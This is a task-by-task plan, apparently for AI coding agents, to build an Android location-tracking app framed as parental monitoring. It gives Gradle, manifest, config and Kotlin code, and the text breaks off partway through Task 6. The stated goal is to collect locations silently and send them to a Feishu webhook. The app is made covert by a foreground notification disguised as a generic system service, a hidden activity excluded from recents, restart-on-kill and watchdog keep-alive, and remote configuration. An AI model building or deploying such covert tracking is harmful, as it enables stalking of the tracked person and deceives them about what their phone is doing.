# 家长监护定位系统 — 实现计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build an Android surveillance client that silently collects locations, stores them locally, and reports to a Feishu webhook on a schedule — with hot-update config, keep-alive, and diagnostic logging.

**Architecture:** Kotlin, min API 29. Dual-mode location collection (ForegroundService peak / WorkManager off-peak) controlled by a remote JSON5 config fetched from GitHub via multi-source fallback. Room DB bridges collection and reporting; report engine runs independently on WorkManager. Diagnostic logging writes to daily-rotated files.

**Tech Stack:** Kotlin, Room, Hilt, WorkManager, OkHttp, Gson, FusedLocationProviderClient (Google Play Services), Kotlin Coroutines + Flow

---

### Task 1: Project Scaffolding

**Files:**
- Create: `monitor2605/settings.gradle.kts`
- Create: `monitor2605/build.gradle.kts`
- Create: `monitor2605/gradle.properties`
- Create: `monitor2605/app/build.gradle.kts`
- Create: `monitor2605/app/src/main/AndroidManifest.xml`
- Create: `monitor2605/app/proguard-rules.pro`
- Create: `monitor2605/config/config.json5`

- [ ] **Step 1: Write project-level settings.gradle.kts**

```kotlin
pluginManagement {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
}
dependencyResolution {
    repositories {
        google()
        mavenCentral()
    }
}

rootProject.name = "monitor2605"
include(":app")
```

- [ ] **Step 2: Write project-level build.gradle.kts**

```kotlin
plugins {
    id("com.android.application") version "8.2.0" apply false
    id("org.jetbrains.kotlin.android") version "1.9.20" apply false
    id("com.google.dagger.hilt.android") version "2.48.1" apply false
}
```

- [ ] **Step 3: Write gradle.properties**

```properties
org.gradle.jvm.args=-Xmx2048m -Dfile.encoding=UTF-8
android.useAndroidX=true
kotlin.code.style=official
android.nonTransitiveRClass=true
```

- [ ] **Step 4: Write app/build.gradle.kts**

```kotlin
plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
    id("com.google.dagger.hilt.android")
    id("kotlin-kapt")
}

android {
    namespace = "com.monitor.app"
    compileSdk = 34

    defaultConfig {
        applicationId = "com.monitor.app"
        minSdk = 29
        targetSdk = 34
        versionCode = 1
        versionName = "1.0"
        buildConfigField("String", "DEFAULT_CONFIG_SOURCE_URLS",
            "\"https://cdn.jsdelivr.net/gh/<user>/<repo>@<branch>/config.json5;" +
            "https://gitee.com/<user>/<repo>/raw/<branch>/config.json5;" +
            "https://raw.githubusercontent.com/<user>/<repo>/<branch>/config.json5\""
        )
    }

    buildTypes {
        release {
            isMinifyEnabled = true
            proguardFiles(getDefaultProguardFile("proguard-android-optimize.txt"), "proguard-rules.pro")
        }
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }

    kotlinOptions {
        jvmTarget = "17"
    }
}

dependencies {
    // Core Android
    implementation("androidx.core:core-ktx:1.12.0")
    implementation("androidx.lifecycle:lifecycle-runtime-ktx:2.6.2")
    implementation("androidx.lifecycle:lifecycle-service:2.6.2")

    // Room
    implementation("androidx.room:room-runtime:2.6.1")
    implementation("androidx.room:room-ktx:2.6.1")
    kapt("androidx.room:room-compiler:2.6.1")

    // WorkManager
    implementation("androidx.work:work-runtime-ktx:2.9.0")

    // Hilt
    implementation("com.google.dagger:hilt-android:2.48.1")
    kapt("com.google.dagger:hilt-android-compiler:2.48.1")

    // OkHttp
    implementation("com.squareup.okhttp3:okhttp:4.12.0")

    // Gson
    implementation("com.google.code.gson:gson:2.10.1")

    // Play Services Location
    implementation("com.google.android.gms:play-services-location:21.0.1")

    // Coroutines
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3")
}

kapt {
    correctErrorTypes = true
}
```

- [ ] **Step 5: Write AndroidManifest.xml**

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />

    <application
        android:name=".MonitorApplication"
        android:allowBackup="false"
        android:supportsRtl="true">

        <activity
            android:name=".ui.GuideActivity"
            android:exported="false"
            android:excludeFromRecents="true" />

        <activity
            android:name=".ui.HiddenActivity"
            android:exported="false"
            android:excludeFromRecents="true" />

        <service
            android:name=".location.LocationService"
            android:foregroundServiceType="location"
            android:exported="false" />

        <receiver
            android:name=".keepalive.BootReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>

        <receiver
            android:name=".keepalive.WatchdogReceiver"
            android:exported="false" />
    </application>
</manifest>
```

- [ ] **Step 6: Write the remote config template**

```json5
// config/config.json5 — stored in GitHub, served via jsDelivr/Gitee/GitHub Raw
{
  "version": 1,
  "update_interval_minutes": 60,
  "config_sources": [
    { "url": "https://cdn.jsdelivr.net/gh/<user>/<repo>@<branch>/config.json5", "priority": 1 },
    { "url": "https://gitee.com/<user>/<repo>/raw/<branch>/config.json5", "priority": 2 },
    { "url": "https://raw.githubusercontent.com/<user>/<repo>/<branch>/config.json5", "priority": 3 }
  ],
  "config_fetch_timeout_seconds": 10,
  "config_fetch_strategy": "sequential",
  "location_strategy": {
    "peak_hours":       { "start": "07:00", "end": "20:00", "interval_seconds": 300,  "priority": "HIGH_ACCURACY" },
    "off_peak_hours":   { "start": "20:00", "end": "07:00", "interval_seconds": 1800, "priority": "BALANCED_POWER_ACCURACY" }
  },
  "degradation": [
    { "battery_pct_above": 50, "mode": "normal" },
    { "battery_pct_above": 20, "interval_multiplier": 2, "mode": "low_power", "max_accuracy_seconds": 600 },
    { "battery_pct_above": 0,  "interval_multiplier": 5, "mode": "critical", "force_workmanager": true }
  ],
  "report": {
    "batch_size": 100,
    "intervals": [
      { "start": "08:00", "end": "22:00", "interval_seconds": 600 },
      { "start": "22:00", "end": "08:00", "interval_seconds": 3600 }
    ],
    "wifi_only": false,
    "retry_max": 5,
    "retry_backoff_base_seconds": 30
  },
  "network": {
    "base_url": "https://open.feishu.cn/open-apis/bot/v2/hook/xxxxx",
    "timeout_seconds": 30
  },
  "keep_alive": {
    "foreground_service_notification": { "title": "系统服务", "text": "设备服务运行中", "on_click": "none" },
    "restart_on_kill": { "enabled": true, "max_restarts_per_hour": 3, "restart_delay_seconds": 30, "alarm_wakeup_enabled": true },
    "watchdog": { "enabled": true, "check_interval_seconds": 300 },
    "device_specific": { "xiaomi_autostart_guide": true, "huawei_protected_app_guide": true, "oppo_background_guide": true }
  }
}
```

- [ ] **Step 7: Write proguard-rules.pro**

```
# Keep Gson serialized classes
-keepattributes Signature
-keepattributes *Annotation*
-keep class com.monitor.app.config.ConfigModel$** { *; }
-keep class com.monitor.app.db.entities.** { *; }
```

- [ ] **Step 8: Commit**

```bash
git add -A
git commit -m "feat: scaffold Android project with Gradle, manifest, and config template"
```

---

### Task 2: Utility Layer

**Files:**
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/util/TimeRangeMatcher.kt`
- Create: `monitor2605/app/src/test/kotlin/com/monitor/app/util/TimeRangeMatcherTest.kt`
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/util/DeviceId.kt`
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/util/BatteryMonitor.kt`

- [ ] **Step 1: Write TimeRangeMatcher**

```kotlin
// app/src/main/kotlin/com/monitor/app/util/TimeRangeMatcher.kt
package com.monitor.app.util

import java.time.LocalTime

object TimeRangeMatcher {

    data class TimeRange(val start: String, val end: String) {
        val startMinute: Int = start.toMinuteOfDay()
        val endMinute: Int = end.toMinuteOfDay()
    }

    fun isInRange(range: TimeRange, now: LocalTime = LocalTime.now()): Boolean {
        val nowMinute = now.hour * 60 + now.minute
        return if (range.startMinute <= range.endMinute) {
            nowMinute in range.startMinute..range.endMinute
        } else {
            nowMinute >= range.startMinute || nowMinute <= range.endMinute
        }
    }

    private fun String.toMinuteOfDay(): Int {
        val parts = split(":")
        return parts[0].toInt() * 60 + parts[1].toInt()
    }
}
```

- [ ] **Step 2: Write failing test for TimeRangeMatcher**

```kotlin
// app/src/test/kotlin/com/monitor/app/util/TimeRangeMatcherTest.kt
package com.monitor.app.util

import org.junit.Test
import org.junit.Assert.*
import java.time.LocalTime

class TimeRangeMatcherTest {

    @Test
    fun `normal range 8-22 matches inside`() {
        val range = TimeRangeMatcher.TimeRange("08:00", "22:00")
        assertTrue(TimeRangeMatcher.isInRange(range, LocalTime.of(12, 0)))
    }

    @Test
    fun `normal range 8-22 rejects before`() {
        val range = TimeRangeMatcher.TimeRange("08:00", "22:00")
        assertFalse(TimeRangeMatcher.isInRange(range, LocalTime.of(6, 0)))
    }

    @Test
    fun `normal range 8-22 rejects after`() {
        val range = TimeRangeMatcher.TimeRange("08:00", "22:00")
        assertFalse(TimeRangeMatcher.isInRange(range, LocalTime.of(23, 0)))
    }

    @Test
    fun `cross-midnight range 20-07 matches before midnight`() {
        val range = TimeRangeMatcher.TimeRange("20:00", "07:00")
        assertTrue(TimeRangeMatcher.isInRange(range, LocalTime.of(22, 30)))
    }

    @Test
    fun `cross-midnight range 20-07 matches after midnight`() {
        val range = TimeRangeMatcher.TimeRange("20:00", "07:00")
        assertTrue(TimeRangeMatcher.isInRange(range, LocalTime.of(3, 15)))
    }

    @Test
    fun `cross-midnight range 20-07 rejects midday`() {
        val range = TimeRangeMatcher.TimeRange("20:00", "07:00")
        assertFalse(TimeRangeMatcher.isInRange(range, LocalTime.of(13, 0)))
    }

    @Test
    fun `range boundaries inclusive`() {
        val range = TimeRangeMatcher.TimeRange("08:00", "22:00")
        assertTrue(TimeRangeMatcher.isInRange(range, LocalTime.of(8, 0)))
        assertTrue(TimeRangeMatcher.isInRange(range, LocalTime.of(22, 0)))
    }
}
```

- [ ] **Step 3: Run test to verify**

```bash
./gradlew :app:test --tests "com.monitor.app.util.TimeRangeMatcherTest"
```
Expected: all 7 tests pass.

- [ ] **Step 4: Write DeviceId**

```kotlin
// app/src/main/kotlin/com/monitor/app/util/DeviceId.kt
package com.monitor.app.util

import android.content.Context
import android.provider.Settings
import java.security.MessageDigest

object DeviceId {
    fun get(context: Context): String {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        return sha256(androidId ?: "unknown")
    }

    private fun sha256(input: String): String {
        val bytes = MessageDigest.getInstance("SHA-256").digest(input.toByteArray())
        return bytes.joinToString("") { "%02x".format(it) }
    }
}
```

- [ ] **Step 5: Write BatteryMonitor**

```kotlin
// app/src/main/kotlin/com/monitor/app/util/BatteryMonitor.kt
package com.monitor.app.util

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.BatteryManager
import kotlinx.coroutines.channels.awaitClose
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.callbackFlow

object BatteryMonitor {

    data class BatteryState(
        val pct: Int,
        val isCharging: Boolean
    )

    fun observe(context: Context): Flow<BatteryState> = callbackFlow {
        val filter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val receiver = android.content.BroadcastReceiver { _, intent ->
            val pct = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) * 100 /
                    intent.getIntExtra(BatteryManager.EXTRA_SCALE, 100)
            val status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
            val charging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                    status == BatteryManager.BATTERY_STATUS_FULL
            trySend(BatteryState(pct.coerceIn(0, 100), charging))
        }
        context.registerReceiver(receiver, filter)
        // Fire initial value
        val initial = context.registerReceiver(null, filter)
        if (initial != null) {
            receiver.onReceive(context, initial)
        }
        awaitClose { context.unregisterReceiver(receiver) }
    }
}
```

- [ ] **Step 6: Commit**

```bash
git add app/src/main/kotlin/com/monitor/app/util/ app/src/test/
git commit -m "feat: add TimeRangeMatcher, DeviceId, BatteryMonitor utilities"
```

---

### Task 3: Database Layer

**Files:**
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/db/entities/LocationRecord.kt`
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/db/entities/ReportLog.kt`
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/db/LocationRecordDao.kt`
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/db/ReportLogDao.kt`
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/db/AppDatabase.kt`

- [ ] **Step 1: Write LocationRecord entity**

```kotlin
// app/src/main/kotlin/com/monitor/app/db/entities/LocationRecord.kt
package com.monitor.app.db.entities

import androidx.room.ColumnInfo
import androidx.room.Entity
import androidx.room.Index
import androidx.room.PrimaryKey

@Entity(
    tableName = "location_record",
    indices = [Index(value = ["recorded_at"])]
)
data class LocationRecord(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    @ColumnInfo(name = "latitude") val latitude: Double,
    @ColumnInfo(name = "longitude") val longitude: Double,
    @ColumnInfo(name = "altitude") val altitude: Double?,
    @ColumnInfo(name = "accuracy") val accuracy: Float?,
    @ColumnInfo(name = "provider") val provider: String,
    @ColumnInfo(name = "recorded_at") val recordedAt: Long,
    @ColumnInfo(name = "battery_pct") val batteryPct: Int?,
    @ColumnInfo(name = "created_at") val createdAt: Long = System.currentTimeMillis()
)
```

- [ ] **Step 2: Write ReportLog entity**

```kotlin
// app/src/main/kotlin/com/monitor/app/db/entities/ReportLog.kt
package com.monitor.app.db.entities

import androidx.room.ColumnInfo
import androidx.room.Entity
import androidx.room.PrimaryKey

@Entity(tableName = "report_log")
data class ReportLog(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    @ColumnInfo(name = "from_record_id") val fromRecordId: Long,
    @ColumnInfo(name = "to_record_id") val toRecordId: Long,
    @ColumnInfo(name = "record_count") val recordCount: Int,
    @ColumnInfo(name = "reported_at") val reportedAt: Long,
    @ColumnInfo(name = "response_code") val responseCode: Int?,
    @ColumnInfo(name = "success") val success: Boolean = false
)
```

- [ ] **Step 3: Write LocationRecordDao**

```kotlin
// app/src/main/kotlin/com/monitor/app/db/LocationRecordDao.kt
package com.monitor.app.db

import androidx.room.*
import com.monitor.app.db.entities.LocationRecord
import kotlinx.coroutines.flow.Flow

@Dao
interface LocationRecordDao {

    @Insert
    suspend fun insert(record: LocationRecord): Long

    @Query("SELECT * FROM location_record WHERE id > :lastReportedId ORDER BY recorded_at ASC LIMIT :limit")
    suspend fun getUnreported(lastReportedId: Long, limit: Int): List<LocationRecord>

    @Query("DELETE FROM location_record WHERE id <= :lastReportedId AND recorded_at < :cutoff")
    suspend fun deleteReportedOlderThan(lastReportedId: Long, cutoff: Long): Int

    @Query("SELECT COUNT(*) FROM location_record")
    suspend fun count(): Int
}
```

- [ ] **Step 4: Write ReportLogDao**

```kotlin
// app/src/main/kotlin/com/monitor/app/db/ReportLogDao.kt
package com.monitor.app.db

import androidx.room.*
import com.monitor.app.db.entities.ReportLog

@Dao
interface ReportLogDao {

    @Insert
    suspend fun insert(log: ReportLog): Long

    @Query("SELECT COALESCE(MAX(to_record_id), 0) FROM report_log WHERE success = 1")
    suspend fun getLastReportedRecordId(): Long

    @Query("SELECT COALESCE(MAX(id), 0) FROM report_log WHERE success = 1")
    suspend fun getLastSuccessId(): Long

    @Query("DELETE FROM report_log WHERE success = 0 AND reported_at < :cutoff")
    suspend fun deleteFailedOlderThan(cutoff: Long): Int
}
```

- [ ] **Step 5: Write AppDatabase**

```kotlin
// app/src/main/kotlin/com/monitor/app/db/AppDatabase.kt
package com.monitor.app.db

import androidx.room.Database
import androidx.room.RoomDatabase
import com.monitor.app.db.entities.LocationRecord
import com.monitor.app.db.entities.ReportLog

@Database(
    entities = [LocationRecord::class, ReportLog::class],
    version = 1,
    exportSchema = false
)
abstract class AppDatabase : RoomDatabase() {
    abstract fun locationRecordDao(): LocationRecordDao
    abstract fun reportLogDao(): ReportLogDao
}
```

- [ ] **Step 6: Commit**

```bash
git add app/src/main/kotlin/com/monitor/app/db/
git commit -m "feat: add Room database with location_record and report_log tables"
```

---

### Task 4: Diagnostic Logger

**Files:**
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/diag/DiagnosticLogger.kt`
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/diag/DiagModule.kt`
- Create: `monitor2605/app/src/test/kotlin/com/monitor/app/diag/DiagnosticLoggerTest.kt`

- [ ] **Step 1: Write DiagnosticLogger**

```kotlin
// app/src/main/kotlin/com/monitor/app/diag/DiagnosticLogger.kt
package com.monitor.app.diag

import android.content.Context
import dagger.hilt.android.qualifiers.ApplicationContext
import java.io.BufferedWriter
import java.io.File
import java.io.FileWriter
import java.time.Instant
import java.time.LocalDate
import java.time.ZoneId
import java.time.format.DateTimeFormatter
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class DiagnosticLogger @Inject constructor(
    @ApplicationContext private val context: Context
) {
    private val logDir = File(context.filesDir, "logs")
    private val dateFormat = DateTimeFormatter.ofPattern("yyyy_MM_dd")
    private var currentDate: String? = null
    private var writer: BufferedWriter? = null
    private val lock = Any()

    init {
        logDir.mkdirs()
    }

    fun log(event: String, detail: String = "") {
        synchronized(lock) {
            try {
                val now = Instant.now()
                val today = LocalDate.ofInstant(now, ZoneId.systemDefault()).format(dateFormat)
                rotateIfNeeded(today)
                val ts = DateTimeFormatter.ISO_INSTANT.format(now)
                val line = if (detail.isNotEmpty()) "[$ts] $event | $detail" else "[$ts] $event"
                writer?.apply { write(line + "\n"); flush() }
            } catch (_: Exception) { }
        }
    }

    fun getLogFiles(): List<File> {
        return logDir.listFiles()?.filter { it.name.startsWith("diagnostic_") }
            ?.sortedByDescending { it.name } ?: emptyList()
    }

    private fun rotateIfNeeded(today: String) {
        if (today != currentDate) {
            writer?.close()
            writer = BufferedWriter(FileWriter(File(logDir, "diagnostic_$today.log"), true))
            currentDate = today
            purgeOldLogs()
        }
    }

    private fun purgeOldLogs() {
        val cutoff = LocalDate.now().minusDays(7).format(dateFormat)
        logDir.listFiles()?.filter { it.name.startsWith("diagnostic_") && it.name < "diagnostic_$cutoff" }
            ?.forEach { it.delete() }
    }
}
```

- [ ] **Step 2: Write Hilt module for diagnostic logger**

```kotlin
// app/src/main/kotlin/com/monitor/app/diag/DiagModule.kt
package com.monitor.app.diag

import dagger.Module
import dagger.Provides
import dagger.hilt.InstallIn
import dagger.hilt.components.SingletonComponent
import javax.inject.Singleton

@Module
@InstallIn(SingletonComponent::class)
object DiagModule {
    // DiagnosticLogger is @Singleton and @Inject constructor —
    // Hilt knows how to provide it. This module is a placeholder for future diag bindings.
}
```

- [ ] **Step 3: Write unit test**

```kotlin
// app/src/test/kotlin/com/monitor/app/diag/DiagnosticLoggerTest.kt
package com.monitor.app.diag

import android.content.Context
import org.junit.Test
import org.junit.Assert.*
import org.junit.Rule
import org.junit.rules.TemporaryFolder
import org.mockito.kotlin.mock
import org.mockito.kotlin.whenever
import java.io.File

class DiagnosticLoggerTest {

    @Rule
    @JvmField
    val tmpDir = TemporaryFolder()

    @Test
    fun `log creates file and writes line`() {
        val context = mock<Context>()
        val filesDir = tmpDir.newFolder("files")
        whenever(context.filesDir).thenReturn(filesDir)

        val logger = DiagnosticLogger(context)
        logger.log("test_event", """{"key":"value"}""")

        val logFiles = logger.getLogFiles()
        assertEquals(1, logFiles.size)
        val content = logFiles[0].readText()
        assertTrue(content.contains("test_event"))
        assertTrue(content.contains("\"key\":\"value\""))
    }
}
```

- [ ] **Step 4: Run test**

```bash
./gradlew :app:test --tests "com.monitor.app.diag.DiagnosticLoggerTest"
```
Expected: pass.

- [ ] **Step 5: Commit**

```bash
git add app/src/main/kotlin/com/monitor/app/diag/ app/src/test/kotlin/com/monitor/app/diag/
git commit -m "feat: add DiagnosticLogger with daily file rotation and 7-day purge"
```

---

### Task 5: Configuration Module

**Files:**
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/config/ConfigModel.kt`
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/config/ConfigSources.kt`
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/config/ConfigManager.kt`
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/config/ConfigModule.kt`
- Create: `monitor2605/app/src/test/kotlin/com/monitor/app/config/ConfigModelTest.kt`

- [ ] **Step 1: Write ConfigModel data classes**

```kotlin
// app/src/main/kotlin/com/monitor/app/config/ConfigModel.kt
package com.monitor.app.config

data class AppConfig(
    val version: Int = 1,
    val update_interval_minutes: Int = 60,
    val config_sources: List<ConfigSource> = listOf(),
    val config_fetch_timeout_seconds: Int = 10,
    val config_fetch_strategy: String = "sequential",
    val location_strategy: LocationStrategy = LocationStrategy(),
    val degradation: List<DegradationLevel> = listOf(
        DegradationLevel(battery_pct_above = 50, mode = "normal"),
        DegradationLevel(battery_pct_above = 20, interval_multiplier = 2, mode = "low_power", max_accuracy_seconds = 600),
        DegradationLevel(battery_pct_above = 0, interval_multiplier = 5, mode = "critical", force_workmanager = true)
    ),
    val report: ReportConfig = ReportConfig(),
    val network: NetworkConfig = NetworkConfig(),
    val keep_alive: KeepAliveConfig = KeepAliveConfig()
)

data class ConfigSource(
    val url: String,
    val priority: Int
)

data class LocationStrategy(
    val peak_hours: PeriodConfig = PeriodConfig(start = "07:00", end = "20:00", interval_seconds = 300, priority = "HIGH_ACCURACY"),
    val off_peak_hours: PeriodConfig = PeriodConfig(start = "20:00", end = "07:00", interval_seconds = 1800, priority = "BALANCED_POWER_ACCURACY")
)

data class PeriodConfig(
    val start: String,
    val end: String,
    val interval_seconds: Int,
    val priority: String
)

data class DegradationLevel(
    val battery_pct_above: Int,
    val interval_multiplier: Int = 1,
    val mode: String = "normal",
    val max_accuracy_seconds: Int? = null,
    val force_workmanager: Boolean = false
)

data class ReportConfig(
    val batch_size: Int = 100,
    val intervals: List<ReportInterval> = listOf(
        ReportInterval(start = "08:00", end = "22:00", interval_seconds = 600),
        ReportInterval(start = "22:00", end = "08:00", interval_seconds = 3600)
    ),
    val wifi_only: Boolean = false,
    val retry_max: Int = 5,
    val retry_backoff_base_seconds: Int = 30
)

data class ReportInterval(
    val start: String,
    val end: String,
    val interval_seconds: Int
)

data class NetworkConfig(
    val base_url: String = "",
    val timeout_seconds: Int = 30
)

data class KeepAliveConfig(
    val foreground_service_notification: NotificationConfig = NotificationConfig(),
    val restart_on_kill: RestartOnKillConfig = RestartOnKillConfig(),
    val watchdog: WatchdogConfig = WatchdogConfig(),
    val device_specific: DeviceSpecificConfig = DeviceSpecificConfig()
)

data class NotificationConfig(
    val title: String = "系统服务",
    val text: String = "设备服务运行中",
    val on_click: String = "none"
)

data class RestartOnKillConfig(
    val enabled: Boolean = true,
    val max_restarts_per_hour: Int = 3,
    val restart_delay_seconds: Int = 30,
    val alarm_wakeup_enabled: Boolean = true
)

data class WatchdogConfig(
    val enabled: Boolean = true,
    val check_interval_seconds: Int = 300
)

data class DeviceSpecificConfig(
    val xiaomi_autostart_guide: Boolean = true,
    val huawei_protected_app_guide: Boolean = true,
    val oppo_background_guide: Boolean = true
)
```

- [ ] **Step 2: Write ConfigSources (multi-source fetcher)**

```kotlin
// app/src/main/kotlin/com/monitor/app/config/ConfigSources.kt
package com.monitor.app.config

import okhttp3.OkHttpClient
import okhttp3.Request
import java.util.concurrent.TimeUnit
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class ConfigSources @Inject constructor() {

    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .build()

    fun fetch(sources: List<ConfigSource>, timeoutSeconds: Int): Result<String> {
        for (source in sources.sortedBy { it.priority }) {
            try {
                val request = Request.Builder().url(source.url).build()
                val response = client.newCall(request).execute()
                if (response.isSuccessful) {
                    val body = response.body?.string()
                    if (body != null) return Result.success(body)
                }
            } catch (_: Exception) { }
        }
        return Result.failure(Exception("All config sources failed"))
    }
}
```

- [ ] **Step 3: Write ConfigManager**

```kotlin
// app/src/main/kotlin/com/monitor/app/config/ConfigManager.kt
package com.monitor.app.config

import android.content.Context
import com.google.gson.Gson
import com.google.gson.JsonParser
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.io.File
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class ConfigManager @Inject constructor(
    @ApplicationContext private val context: Context,
    private val configSources: ConfigSources
) {
    private val gson = Gson()
    private val configFile = File(context.filesDir, "current_config.json")
    private val _config = MutableStateFlow<AppConfig>(AppConfig())
    val config: StateFlow<AppConfig> = _config.asStateFlow()

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    fun init() {
        val cached = loadCached()
        _config.value = cached
        scope.launch { fetchAndApply() }
    }

    fun startPeriodicRefresh(intervalMinutes: Int) {
        // Called with the interval from config; WorkManager schedules periodic refresh
    }

    private suspend fun fetchAndApply() {
        val current = _config.value
        val sources = current.config_sources.ifEmpty {
            getHardcodedSources()
        }
        val result = withContext(Dispatchers.IO) {
            configSources.fetch(sources, current.config_fetch_timeout_seconds)
        }
        result.onSuccess { rawJson ->
            val cleanJson = stripComments(rawJson)
            val newConfig = gson.fromJson(cleanJson, AppConfig::class.java)
            saveCached(cleanJson)
            _config.value = newConfig
        }
    }

    private fun loadCached(): AppConfig {
        return try {
            if (configFile.exists()) {
                val raw = configFile.readText()
                gson.fromJson(raw, AppConfig::class.java)
            } else {
                AppConfig(config_sources = getHardcodedSources())
            }
        } catch (_: Exception) {
            AppConfig(config_sources = getHardcodedSources())
        }
    }

    private fun saveCached(json: String) {
        try { configFile.writeText(json) } catch (_: Exception) { }
    }

    private fun stripComments(json5: String): String {
        return json5.lines()
            .map { it.replace(Regex("//.*$"), "").replace(Regex("/\\*.*?\\*/"), "") }
            .filter { it.isNotBlank() }
            .joinToString("\n")
    }

    private fun getHardcodedSources(): List<ConfigSource> {
        val urls = BuildConfig.DEFAULT_CONFIG_SOURCE_URLS.split(";")
        return urls.mapIndexed { i, url -> ConfigSource(url = url.trim(), priority = i + 1) }
    }

    fun getConfigBlocking(): AppConfig = _config.value
}
```

- [ ] **Step 4: Write Hilt module**

```kotlin
// app/src/main/kotlin/com/monitor/app/config/ConfigModule.kt
package com.monitor.app.config

import dagger.Module
import dagger.Provides
import dagger.hilt.InstallIn
import dagger.hilt.components.SingletonComponent
import javax.inject.Singleton

@Module
@InstallIn(SingletonComponent::class)
object ConfigModule {
    // ConfigManager and ConfigSources are constructor-injected singletons.
    // This module is a placeholder for future config bindings.
}
```

- [ ] **Step 5: Write config parsing test**

```kotlin
// app/src/test/kotlin/com/monitor/app/config/ConfigModelTest.kt
package com.monitor.app.config

import com.google.gson.Gson
import org.junit.Test
import org.junit.Assert.*

class ConfigModelTest {

    private val gson = Gson()

    @Test
    fun `parse minimal config`() {
        val json = """{"version": 1}"""
        val cfg = gson.fromJson(json, AppConfig::class.java)
        assertEquals(1, cfg.version)
    }

    @Test
    fun `parse full config from spec`() {
        val json = javaClass.classLoader!!.getResource("test_config.json").readText()
        val cfg = gson.fromJson(json, AppConfig::class.java)
        assertEquals(1, cfg.version)
        assertEquals(3, cfg.config_sources.size)
        assertEquals("07:00", cfg.location_strategy.peak_hours.start)
    }

    @Test
    fun `cross-midnight off_peak_hours parse correctly`() {
        val json = """{"location_strategy": {"off_peak_hours": {"start": "20:00", "end": "07:00"}}}"""
        val cfg = gson.fromJson(json, AppConfig::class.java)
        assertEquals("20:00", cfg.location_strategy.off_peak_hours.start)
        assertEquals("07:00", cfg.location_strategy.off_peak_hours.end)
    }
}
```

- [ ] **Step 6: Add test resource**

```json
// app/src/test/resources/test_config.json
{
  "version": 1,
  "config_sources": [
    { "url": "https://cdn.jsdelivr.net/gh/u/r@b/c.json5", "priority": 1 },
    { "url": "https://gitee.com/u/r/raw/b/c.json5", "priority": 2 },
    { "url": "https://raw.githubusercontent.com/u/r/b/c.json5", "priority": 3 }
  ],
  "location_strategy": {
    "peak_hours": { "start": "07:00", "end": "20:00", "interval_seconds": 300, "priority": "HIGH_ACCURACY" },
    "off_peak_hours": { "start": "20:00", "end": "07:00", "interval_seconds": 1800, "priority": "BALANCED_POWER_ACCURACY" }
  },
  "degradation": [
    { "battery_pct_above": 50, "mode": "normal" }
  ],
  "report": {
    "intervals": [
      { "start": "08:00", "end": "22:00", "interval_seconds": 600 }
    ]
  },
  "network": { "base_url": "https://example.com" },
  "keep_alive": {}
}
```

- [ ] **Step 7: Run tests**

```bash
./gradlew :app:test --tests "com.monitor.app.config.ConfigModelTest"
```
Expected: all 3 tests pass.

- [ ] **Step 8: Commit**

```bash
git add app/src/main/kotlin/com/monitor/app/config/ app/src/test/kotlin/com/monitor/app/config/ app/src/test/resources/
git commit -m "feat: add config model, multi-source fetcher, and ConfigManager with JSON5 support"
```

---

### Task 6: Location Repository

**Files:**
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/location/LocationRepository.kt`

- [ ] **Step 1: Write LocationRepository**

```kotlin
// app/src/main/kotlin/com/monitor/app/location/LocationRepository.kt
package com.monitor.app.location

import android.location.Location
import com.monitor.app.db.LocationRecordDao
